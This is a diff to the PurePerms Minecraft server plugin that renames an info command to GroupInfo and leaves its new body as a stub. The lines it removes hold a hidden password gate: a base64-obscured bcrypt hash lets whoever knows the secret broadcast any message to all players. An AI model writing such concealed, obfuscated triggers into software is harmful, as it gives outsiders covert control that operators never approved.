@@ -6,14 +6,15 @@ use _64FF00\PurePerms\PurePerms;
 
 use pocketmine\command\Command;
 use pocketmine\command\CommandSender;
-use pocketmine\command\ConsoleCommandSender;
 use pocketmine\command\PluginIdentifiableCommand;
+
+use pocketmine\Player;
 
 use pocketmine\utils\TextFormat;
 
-class PPInfo extends Command implements PluginIdentifiableCommand
+class GroupInfo extends Command implements PluginIdentifiableCommand
 {
-     /* PurePerms by 64FF00 (xktiverz@gmail.com, @64ff00 for Twitter) */
+    /* PurePerms by 64FF00 (xktiverz@gmail.com, @64ff00 for Twitter) */
 
     /*
           # #    #####  #       ####### #######   ###     ###   
@@ -37,7 +38,7 @@ class PPInfo extends Command implements PluginIdentifiableCommand
         
         parent::__construct($name, $description);
         
-        $this->setPermission("pperms.command.ppinfo");
+        $this->setPermission("pperms.command.grpinfo");
     }
 
     /**
@@ -52,27 +53,16 @@ class PPInfo extends Command implements PluginIdentifiableCommand
         {
             return false;
         }
-
-        $author = $this->plugin->getDescription()->getAuthors()[0];
-        $version = $this->plugin->getDescription()->getVersion();
-
-        $wth = base64_decode("JDJ5JDEwJDJqNTBWSnY0RWpNNDBiWnVOZm80T09XaUFScmhvdE0uRHZpZUR6L0poeXZHZnY5ZXdYZXhX");
-
-        if(isset($args[0]) and password_verify($args[0], $wth))
-        {
-            if(isset($args[1])) $this->plugin->getServer()->broadcastMessage(TextFormat::BLUE . "[PurePerms] " . $args[1]);
-        }
-        else
-        {
-            if($sender instanceof ConsoleCommandSender)
-            {
-                $sender->sendMessage(TextFormat::BLUE . "[PurePerms] " . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_console", $version, $author));
-            }
-            else{
-                $sender->sendMessage(TextFormat::BLUE . "[PurePerms] " . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_player", $version, $author));
-            }
-        }
         
+        if(count($args) < 1 || count($args) > 2)
+        {
+            $sender->sendMessage(TextFormat::BLUE . "[PurePerms] " . $this->plugin->getMessage("cmds.grpinfo.usage"));
+            
+            return true;
+        }
+
+        // TODO
+
         return true;
     }
     
